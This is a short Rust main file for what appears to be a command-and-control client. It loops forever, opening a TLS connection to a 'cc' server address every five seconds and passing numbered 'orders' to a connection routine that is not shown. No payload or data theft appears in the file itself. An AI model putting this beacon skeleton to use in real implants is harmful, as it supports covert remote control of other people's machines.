
mod ssl_builder;
mod connection;
mod make_dir;
mod set_dir;
mod args;

use std::net::TcpStream;
use std::process::Command;
use std::process::exit;

fn main() {

    set_dir::set_working_directory();

    let Ok((ip_addr, fs_sock_addr, cc_sock_addr)) = args::get_args() 
        else{return };

    let code = make_dir::make_dir();
    match code {
        0 => {},
        other =>{
            exit(other);
        },
    };

    let mut number_of_order: u64 = 0;
    loop {
    
        let connector = ssl_builder::ssl_builder();

        if let Ok(stream_cc) = TcpStream::connect(cc_sock_addr) {
            let stream_cc = connector.connect(ip_addr.to_string().as_str(), 
                                              stream_cc).unwrap();
            connection::flow(stream_cc, ip_addr.to_string(), fs_sock_addr, 
                             connector, number_of_order);

            number_of_order += 1;
        }

        let _ = Command::new("sleep")
            .args(["5"]).output();
    }
}





// Reference https://doc.rust-lang.org/std/net/struct.TcpStream.html
